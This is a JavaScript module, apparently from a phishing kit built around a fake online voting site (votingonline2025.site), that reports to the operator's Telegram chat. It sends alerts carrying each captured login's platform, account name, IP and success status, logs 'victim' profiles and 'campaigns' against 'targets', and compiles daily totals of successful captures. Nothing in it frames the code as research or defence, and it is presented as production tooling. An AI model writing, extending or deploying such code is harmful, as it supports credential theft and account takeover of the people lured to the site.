/**
 * Production Telegram Notifier
 * Send system notifications via Telegram
 */

import axios from "axios";
import dotenv from "dotenv";

// Load production environment
dotenv.config({ path: "./production/.env.production" });

class TelegramNotifier {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.enabled = process.env.TELEGRAM_NOTIFICATIONS === "true";

    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  // Send text message
  async sendMessage(text, options = {}) {
    if (!this.enabled || !this.botToken || !this.chatId) {
      console.log("📱 Telegram notification (disabled):", text);
      return false;
    }

    try {
      const payload = {
        chat_id: this.chatId,
        text: text,
        parse_mode: options.parseMode || "Markdown",
        disable_web_page_preview: true,
        ...options,
      };

      const response = await axios.post(`${this.apiUrl}/sendMessage`, payload);

      if (response.data.ok) {
        console.log("📱 Telegram message sent successfully");
        return true;
      } else {
        console.error("❌ Telegram API error:", response.data);
        return false;
      }
    } catch (error) {
      console.error("❌ Failed to send Telegram message:", error.message);
      return false;
    }
  }

  // Send system startup notification
  async sendStartupNotification() {
    const message = `
🟢 *System Started*

🌐 Domain: votingonline2025.site
⏰ Time: ${new Date().toLocaleString("vi-VN")}
🚀 Status: Production Ready

📊 Services:
• Main App: ✅ Started
• API Server: ✅ Started
• Database: ✅ Connected
• Health Monitor: ✅ Running

🔗 Access:
• Main: https://votingonline2025.site
• Admin: https://admin.votingonline2025.site
`;

    return await this.sendMessage(message);
  }

  // Send authentication notification
  async sendAuthNotification(platform, account, status, ip) {
    const statusEmoji = status === "success" ? "✅" : "❌";
    const message = `
🔐 *Authentication Alert*

${statusEmoji} Platform: ${platform.toUpperCase()}
👤 Account: ${account}
🌍 IP: ${ip}
⏰ Time: ${new Date().toLocaleString("vi-VN")}
📊 Status: ${status.toUpperCase()}
`;

    return await this.sendMessage(message);
  }

  // Send victim management notification
  async sendVictimNotification(action, profileName, platform) {
    const actionEmojis = {
      create: "➕",
      update: "✏️",
      delete: "🗑️",
    };

    const emoji = actionEmojis[action] || "🔄";
    const message = `
👥 *Victim Management*

${emoji} Action: ${action.toUpperCase()}
📋 Profile: ${profileName}
🌐 Platform: ${platform}
⏰ Time: ${new Date().toLocaleString("vi-VN")}
`;

    return await this.sendMessage(message);
  }

  // Send campaign notification
  async sendCampaignNotification(campaignName, status, platform, targets) {
    const statusEmoji = status === "success" ? "✅" : "❌";
    const message = `
📢 *Campaign Update*

${statusEmoji} Campaign: ${campaignName}
🌐 Platform: ${platform}
🎯 Targets: ${targets}
📊 Status: ${status.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("vi-VN")}
`;

    return await this.sendMessage(message);
  }

  // Send system error notification
  async sendErrorNotification(error, context) {
    const message = `
🚨 *System Error*

⚠️ Error: ${error.message}
📍 Context: ${context}
⏰ Time: ${new Date().toLocaleString("vi-VN")}

🔧 Action Required: Check logs and investigate
`;

    return await this.sendMessage(message);
  }

  // Send health check notification
  async sendHealthNotification(service, status, responseTime) {
    const statusEmoji = status === "healthy" ? "✅" : "❌";
    const message = `
🔍 *Health Check*

${statusEmoji} Service: ${service}
📊 Status: ${status.toUpperCase()}
⏱️ Response: ${responseTime}ms
⏰ Time: ${new Date().toLocaleString("vi-VN")}
`;

    return await this.sendMessage(message);
  }

  // Send daily summary
  async sendDailySummary(stats) {
    const message = `
📈 *Daily Summary - ${new Date().toLocaleDateString("vi-VN")}*

🔐 Authentication:
• Total: ${stats.totalAuth}
• Success: ${stats.successAuth} (${Math.round((stats.successAuth / stats.totalAuth) * 100)}%)
• Failed: ${stats.failedAuth}

👥 Victim Management:
• Profiles: ${stats.totalProfiles}
• New Today: ${stats.newProfiles}
• Actions: ${stats.totalActions}

📢 Campaigns:
• Active: ${stats.activeCampaigns}
• Completed: ${stats.completedCampaigns}
• Success Rate: ${stats.campaignSuccessRate}%

🔍 System Health:
• Uptime: ${stats.uptime}
• Memory: ${stats.memoryUsage}%
• Disk: ${stats.diskUsage}%

💾 Database:
• Records: ${stats.totalRecords}
• Size: ${stats.dbSize}MB
`;

    return await this.sendMessage(message);
  }

  // Send maintenance notification
  async sendMaintenanceNotification(action, details) {
    const message = `
🔧 *Maintenance Alert*

🛠️ Action: ${action}
📝 Details: ${details}
⏰ Time: ${new Date().toLocaleString("vi-VN")}

ℹ️ System may experience brief interruptions
`;

    return await this.sendMessage(message);
  }

  // Send backup notification
  async sendBackupNotification(success, size, duration) {
    const statusEmoji = success ? "✅" : "❌";
    const message = `
💾 *Backup ${success ? "Completed" : "Failed"}*

${statusEmoji} Status: ${success ? "SUCCESS" : "FAILED"}
📦 Size: ${size}MB
⏱️ Duration: ${duration}s
⏰ Time: ${new Date().toLocaleString("vi-VN")}
`;

    return await this.sendMessage(message);
  }

  // Test Telegram connection
  async testConnection() {
    try {
      const response = await axios.get(`${this.apiUrl}/getMe`);

      if (response.data.ok) {
        console.log("✅ Telegram bot connection successful");
        console.log(`   Bot: ${response.data.result.first_name}`);
        console.log(`   Username: @${response.data.result.username}`);
        return true;
      } else {
        console.error("❌ Telegram bot test failed:", response.data);
        return false;
      }
    } catch (error) {
      console.error("❌ Telegram connection test failed:", error.message);
      return false;
    }
  }
}

// Create and export instance
const telegramNotifier = new TelegramNotifier();

export default telegramNotifier;
